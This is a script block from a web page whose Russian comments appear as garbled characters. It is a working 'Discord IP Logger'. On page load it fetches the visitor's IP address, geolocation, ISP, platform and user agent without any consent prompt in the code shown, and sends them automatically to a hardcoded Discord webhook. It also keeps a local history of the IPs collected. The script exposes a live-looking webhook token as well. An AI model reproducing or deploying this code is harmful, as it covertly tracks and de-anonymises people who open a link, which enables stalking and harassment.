    <script>
        // –í–ê–® DISCORD WEBHOOK URL
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1462784316047360122/BiCpoNbvNSOPFUrsUBV0Kia-OldT7Vy67Zy5yrPrhBpbizOXQY1pBAYj_gBNpLFOAU9i';
        
        // –ù–∞—Å—Ç—Ä–æ–π–∫–∏ –∞–≤—Ç–æ–æ—Ç–ø—Ä–∞–≤–∫–∏
        const AUTO_SEND = true; // –í–∫–ª—é—á–µ–Ω–æ!
        const SEND_ONCE_PER_SESSION = true; // –û–¥–∏–Ω —Ä–∞–∑ –∑–∞ —Å–µ—Å—Å–∏—é
        
        let currentIP = '';
        let currentGeoData = {};
        let hasSent = false;
        let sendCount = parseInt(localStorage.getItem('ipSendCount') || '0');
        let uniqueIPs = JSON.parse(localStorage.getItem('uniqueIPs') || '[]');
        
        // –û–±–Ω–æ–≤–ª—è–µ–º —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É
        function updateStats() {
            document.getElementById('totalSends').textContent = sendCount;
            document.getElementById('todaySends').textContent = getTodaySends();
            document.getElementById('uniqueIPs').textContent = uniqueIPs.length;
        }
        
        // –ü–æ–ª—É—á–∞–µ–º –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –æ—Ç–ø—Ä–∞–≤–æ–∫ –∑–∞ —Å–µ–≥–æ–¥–Ω—è
        function getTodaySends() {
            const today = new Date().toDateString();
            const history = JSON.parse(localStorage.getItem('sendHistory') || '[]');
            return history.filter(item => new Date(item.date).toDateString() === today).length;
        }
        
        // –î–æ–±–∞–≤–ª—è–µ–º IP –≤ —Å–ø–∏—Å–æ–∫ —É–Ω–∏–∫–∞–ª—å–Ω—ã—Ö
        function addUniqueIP(ip) {
            if (!uniqueIPs.includes(ip)) {
                uniqueIPs.push(ip);
                localStorage.setItem('uniqueIPs', JSON.stringify(uniqueIPs));
            }
        }
        
        // –î–æ–±–∞–≤–ª—è–µ–º –∑–∞–ø–∏—Å—å –≤ –∏—Å—Ç–æ—Ä–∏—é
        function addToHistory(ip, country, city) {
            const history = JSON.parse(localStorage.getItem('sendHistory') || '[]');
            history.push({
                ip,
                country,
                city,
                date: new Date().toISOString(),
                timestamp: Date.now()
            });
            
            // –•—Ä–∞–Ω–∏–º —Ç–æ–ª—å–∫–æ –ø–æ—Å–ª–µ–¥–Ω–∏–µ 100 –∑–∞–ø–∏—Å–µ–π
            if (history.length > 100) {
                history.splice(0, history.length - 100);
            }
            
            localStorage.setItem('sendHistory', JSON.stringify(history));
        }
        
        // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ø—Ä–µ–≤—å—é embed
        function showEmbedPreview() {
            const preview = document.getElementById('embedPreview');
            preview.classList.add('visible');
            
            document.getElementById('previewIP').textContent = currentIP || '192.168.1.1';
            document.getElementById('previewCountry').textContent = currentGeoData.country_name || '–†–æ—Å—Å–∏—è';
            document.getElementById('previewCity').textContent = currentGeoData.city || '–ú–æ—Å–∫–≤–∞';
            document.getElementById('previewTime').textContent = new Date().toLocaleTimeString();
        }
        
        // –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –ø–æ–ª—É—á–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö
        async function fetchIPData() {
            try {
                // –ü–æ–ª—É—á–∞–µ–º IP
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                currentIP = ipData.ip;
                
                // –ü–æ–ª—É—á–∞–µ–º –≥–µ–æ–¥–∞–Ω–Ω—ã–µ
                const geoResponse = await fetch(`https://ipapi.co/${currentIP}/json/`);
                currentGeoData = await geoResponse.json();
                
                // –û–±–Ω–æ–≤–ª—è–µ–º UI
                document.getElementById('ipAddress').textContent = currentIP;
                document.getElementById('country').textContent = currentGeoData.country_name || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ';
                document.getElementById('city').textContent = currentGeoData.city || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ';
                document.getElementById('isp').textContent = currentGeoData.org || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ';
                document.getElementById('sendTime').textContent = new Date().toLocaleTimeString();
                
                // –î–æ–±–∞–≤–ª—è–µ–º –≤ —É–Ω–∏–∫–∞–ª—å–Ω—ã–µ IP
                addUniqueIP(currentIP);
                
                // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –æ—Ç–ø—Ä–∞–≤–∫–∞
                if (AUTO_SEND && !hasSent) {
                    if (SEND_ONCE_PER_SESSION && sessionStorage.getItem('alreadySent') === 'true') {
                        console.log('–£–∂–µ –æ—Ç–ø—Ä–∞–≤–ª—è–ª–∏ –≤ —ç—Ç–æ–π —Å–µ—Å—Å–∏–∏');
                    } else {
                        await sendToDiscord();
                        sessionStorage.setItem('alreadySent', 'true');
                    }
                }
                
                // –ü—Ä—è—á–µ–º —ç–∫—Ä–∞–Ω –∑–∞–≥—Ä—É–∑–∫–∏
                setTimeout(() => {
                    document.getElementById('loadingScreen').style.opacity = '0';
                    setTimeout(() => {
                        document.getElementById('loadingScreen').style.display = 'none';
                        document.getElementById('mainContent').style.display = 'block';
                    }, 500);
                }, 1000);
                
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞:', error);
                document.getElementById('ipAddress').textContent = '–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è';
                document.getElementById('loadingScreen').innerHTML = `
                    <div style="color: #f23f43; text-align: center;">
                        <i class="fas fa-exclamation-triangle fa-3x"></i>
                        <h2>–û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è</h2>
                        <p>–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å IP –∞–¥—Ä–µ—Å</p>
                        <button onclick="location.reload()" style="margin-top: 20px; padding: 10px 20px; background: #7289da; border: none; border-radius: 10px; color: white; cursor: pointer;">
                            –ü–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å —Å–Ω–æ–≤–∞
                        </button>
                    </div>
                `;
            }
        }
        
        // –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Discord
        async function sendToDiscord() {
            try {
                hasSent = true;
                sendCount++;
                localStorage.setItem('ipSendCount', sendCount.toString());
                
                // –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
                const message = {
                    content: `üåê **–ù–æ–≤—ã–π IP –∞–¥—Ä–µ—Å –ø–æ–ª—É—á–µ–Ω!**`,
                    embeds: [{
                        title: "üìä –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏",
                        fields: [
                            { 
                                name: "üîç IP –ê–¥—Ä–µ—Å", 
                                value: `\`\`\`${currentIP}\`\`\``, 
                                inline: false 
                            },
                            { 
                                name: "üìç –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è", 
                                value: `${currentGeoData.country_name || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}, ${currentGeoData.city || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}\n${currentGeoData.region || ''}`, 
                                inline: true 
                            },
                            { 
                                name: "üè¢ –ò–Ω—Ç–µ—Ä–Ω–µ—Ç-–ø—Ä–æ–≤–∞–π–¥–µ—Ä", 
                                value: currentGeoData.org || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ', 
                                inline: true 
                            },
                            { 
                                name: "üì± –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ", 
                                value: `${navigator.platform} ‚Ä¢ ${navigator.userAgent.substring(0, 50)}...`, 
                                inline: false 
                            },
                            { 
                                name: "üïê –í—Ä–µ–º—è –ø–æ–ª—É—á–µ–Ω–∏—è", 
                                value: new Date().toLocaleString('ru-RU', { 
                                    weekday: 'long',
                                    year: 'numeric',
                                    month: 'long',
                                    day: 'numeric',
                                    hour: '2-digit',
                                    minute: '2-digit',
                                    second: '2-digit'
                                }), 
                                inline: false 
                            }
                        ],
                        color: 0x5865F2,
                        footer: {
                            text: `Discord IP Logger ‚Ä¢ –í—Å–µ–≥–æ –æ—Ç–ø—Ä–∞–≤–æ–∫: ${sendCount}`
                        },
                        timestamp: new Date().toISOString()
                    }]
                };
                
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(message)
                });
                
                // –î–æ–±–∞–≤–ª—è–µ–º –≤ –∏—Å—Ç–æ—Ä–∏—é
                addToHistory(
                    currentIP,
                    currentGeoData.country_name || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                    currentGeoData.city || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'
                );
                
                // –û–±–Ω–æ–≤–ª—è–µ–º —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É
                updateStats();
                
                console.log(`‚úÖ IP –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω: ${currentIP}`);
                
            } catch (error) {
                console.error('‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏:', error);
            }
        }
        
        // –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö
        function refreshData() {
            document.getElementById('loadingScreen').style.display = 'flex';
            document.getElementById('mainContent').style.display = 'none';
            hasSent = false;
            fetchIPData();
        }
        
        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
        document.addEventListener('DOMContentLoaded', () => {
            updateStats();
            fetchIPData();
            
            // –û–±–Ω–æ–≤–ª—è–µ–º –≤—Ä–µ–º—è –∫–∞–∂–¥—É—é —Å–µ–∫—É–Ω–¥—É
            setInterval(() => {
                if (document.getElementById('sendTime')) {
                    document.getElementById('sendTime').textContent = new Date().toLocaleTimeString();
                }
            }, 1000);
        });
    </script>
